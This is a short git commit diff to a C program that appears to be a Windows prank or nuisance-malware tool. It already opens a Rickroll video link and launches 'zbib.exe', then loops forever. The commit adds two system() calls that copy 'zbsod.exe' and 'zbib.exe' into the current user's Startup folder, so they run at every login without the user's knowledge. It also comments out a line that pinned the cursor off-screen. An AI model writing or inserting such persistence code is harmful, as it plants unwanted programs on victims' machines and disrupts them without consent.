1fe95b92bdd4d18f3d789de19fb66353e9744386
Helheimiss_Windows11 <you@example.com>
2024-11-17 01:52:21 +0300

    changes

--- main.c
+++ main.c
@@ -10,11 +10,13 @@ int main()
         system("start https://youtu.be/dQw4w9WgXcQ?si=_iy9BnoHWlGCyIDY");
     }
 
+    system("copy zbsod.exe \"C:\\Users\\%username%\\AppData\\Roaming\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\zbsod.exe\"");
+    system("copy zbib.exe \"C:\\Users\\%username%\\AppData\\Roaming\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\zbib.exe\"");
     system("start zbib.exe");
 
     while (1)
     {
-        SetCursorPos(2000, 2000);
+        // SetCursorPos(2000, 2000);
     }
     
     
